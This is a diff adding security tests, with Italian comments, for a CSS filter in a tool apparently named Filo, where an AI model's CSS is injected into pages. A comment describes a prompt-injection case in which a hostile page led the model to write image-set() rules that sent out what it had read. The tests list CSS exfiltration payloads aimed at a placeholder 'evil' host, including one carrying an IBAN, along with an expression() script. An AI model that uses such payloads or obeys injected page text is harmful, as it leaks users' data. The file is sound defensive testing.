@@ -123,3 +123,49 @@ test('buildCss vuoto quando non c\'è nulla di valido (Filo non inietta nulla)',
   assert.equal(R.buildCss(R.normalizeRules({ selettore: 'h1', css: '@import evil' })), '');
   assert.equal(R.buildCss(R.normalizeRules({})), '');
 });
+
+// #533 (decimo giro di verifica) — il divieto di andare in rete era scritto
+// sulla PAROLA `url(`, e una pagina ostile faceva scrivere al modello
+// `image-set("https://…")`, che fa la stessa cosa e passava liscio: il foglio
+// di stile iniettato portava fuori quello che Filo aveva appena letto. Adesso
+// la regola è una lista di funzioni AMMESSE: qui sotto stanno le scritture
+// equivalenti, perché una lista di vietate non finisce mai.
+test('SICUREZZA: nessuna scrittura che porti il CSS in rete supera il filtro', () => {
+  const fuori = [
+    'background-image: url(http://evil/x.gif)',
+    'background-image: image-set("https://evil/x?d=IBAN" 1x)',
+    'background-image: -webkit-image-set("https://evil/x" 1x)',
+    'background-image: src("https://evil/x")',
+    'cursor: image-set("https://evil/c.png" 1x), auto',
+    'list-style-image: image-set("https://evil/b.png" 1x)',
+    'background-image: -webkit-cross-fade(image-set("https://evil/x" 1x), red, 50%)',
+    'border-image-source: image-set("https://evil/x" 1x)',
+    'width: expression(alert(1))',
+    '-moz-binding: image-set("https://evil/x" 1x)',
+  ];
+  for (const css of fuori) {
+    assert.equal(R.normalizeRules({ selettore: 'body', css }).length, 0, css);
+    assert.equal(R.buildCss(R.normalizeRules({ selettore: 'body', css })), '', css);
+  }
+});
+
+test('SICUREZZA: un selettore che è un at-rule non diventa un blocco @font-face', () => {
+  assert.equal(R.normalizeRules({ selettore: '@font-face', css: 'font-family: x; src: local(y)' }).length, 0);
+  assert.equal(R.normalizeRules({ selettore: '@media all', css: 'color: red' }).length, 0);
+});
+
+test('l\'estetica vera continua a passare: colori, gradienti, calc, trasformazioni, filtri', () => {
+  const dentro = [
+    'color: rgb(200, 30, 30)',
+    'background: linear-gradient(#fff, #000)',
+    'background: -webkit-linear-gradient(#fff, #000)',
+    'font-size: calc((1rem + 2px) * 1.2)',
+    'transform: translateY(2px) rotate(3deg)',
+    'filter: drop-shadow(0 1px 2px rgba(0, 0, 0, 0.3))',
+    'color: var(--sn-text)',
+    'transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1)',
+  ];
+  for (const css of dentro) {
+    assert.equal(R.normalizeRules({ selettore: 'p', css }).length, 1, css);
+  }
+});
